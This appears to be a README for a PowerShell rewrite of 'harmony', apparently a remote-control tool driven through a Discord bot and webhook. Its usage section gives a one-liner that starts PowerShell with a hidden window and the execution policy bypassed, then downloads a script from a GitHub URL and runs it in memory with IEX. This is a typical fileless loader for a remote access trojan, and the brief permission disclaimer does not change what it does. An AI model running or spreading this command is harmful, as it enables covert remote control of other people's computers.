PowerShell rewrite of the original Python code to allow it to run in memory, be more efficient (~20 MB EXE (Nuitka) -> ~4 KB PowerShell Script) and easier to update.

### **Usage Instructions:**

To execute the script, run the following command on the remote computer you own or have permission to run this on, making sure to replace the placeholders with your own Discord Bot Token, Server ID, and Webhook URL:

```powershell
powershell -W Hidden -EP Bypass -C "$TOKEN='<YOUR_BOT_TOKEN>';$serverID='<YOUR_SERVER_ID>';$whURL='<YOUR_WEBHOOK_URL>';IEX(IWR'https://raw.githubusercontent.com/olivia1246/harmony/refs/heads/powershell/harmony.ps1'-UseBasicParsing);exit"
```
